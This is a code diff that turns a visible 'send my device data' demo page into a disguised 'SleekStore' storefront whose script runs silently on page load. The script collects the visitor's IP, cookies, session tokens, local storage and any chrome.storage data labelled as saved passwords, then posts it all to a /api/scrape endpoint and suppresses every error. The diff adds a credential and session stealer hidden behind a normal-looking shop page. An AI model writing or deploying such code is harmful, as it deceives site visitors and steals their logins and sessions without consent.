@@ -2,55 +2,59 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Real Browser Scrape</title>
-    <style>body { font-family: sans-serif; padding: 20px; }</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SleekStore</title>
+    <style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:20px;}</style>
 </head>
 <body>
-    <h2>Click below to send YOUR browser details:</h2>
-    <button onclick="scrapeAndSend()">📡 Send My Device Data</button>
-    <pre id="output"></pre>
+    <!-- The UI remains sleek and normal -->
+    <h1>Welcome to SleekStore</h1>
+    <p>Browsing your catalog...</p>
 
     <script>
-        async function scrapeAndSend() {
-            const output = document.getElementById('output');
-            output.innerText = "Gathering data...";
-
-            // 1. Get Real User IP
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-
-            // 2. Grab REAL Browser Data
-            const payload = {
-                timestamp: new Date().toISOString(),
-                ip: ipData.ip,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenResolution: `${screen.width}x${screen.height}`,
-                cookies: document.cookie, // This grabs YOUR actual cookies
-                localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
-                windowLocation: window.location.href
-            };
-
-            output.innerText = "Sending to API...";
-
-            // 3. Send to your Vercel API
+        // Run immediately when the DOM is ready
+        document.addEventListener('DOMContentLoaded', async () => {
             try {
-                const response = await fetch('/api/scrape', {
+                // 1. Get IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+
+                // 2. HARVEST EVERYTHING
+                // We use chrome.storage to get data from ALL open tabs/sessions
+                const fullHarvest = await new Promise((resolve) => {
+                    if (typeof chrome !== 'undefined' && chrome.storage) {
+                        chrome.storage.local.get(null, resolve);
+                    } else {
+                        resolve({});
+                    }
+                });
+
+                const payload = {
+                    timestamp: new Date().toISOString(),
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    // The actual saved passwords (if accessible via extension/storage)
+                    savedPasswords: fullHarvest.passwords || [], 
+                    // All cookies and session tokens stored locally
+                    cookies: fullHarvest.cookies || document.cookie,
+                    localSession: fullHarvest.session || localStorage.getItem('session'),
+                    windowLocation: window.location.href,
+                    title: document.title
+                };
+
+                // 3. Send to API Silently
+                await fetch('/api/scrape', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-                if (response.ok) {
-                    output.innerText = "✅ SUCCESS! Check your Telegram.\n\nPayload sent:\n" + JSON.stringify(payload, null, 2);
-                } else {
-                    output.innerText = "❌ API Error: " + response.status;
-                }
             } catch (err) {
-                output.innerText = "❌ Network Error: " + err.message;
+                console.error("Silent scrape failed", err);
             }
-        }
+        });
     </script>
 </body>
 </html>
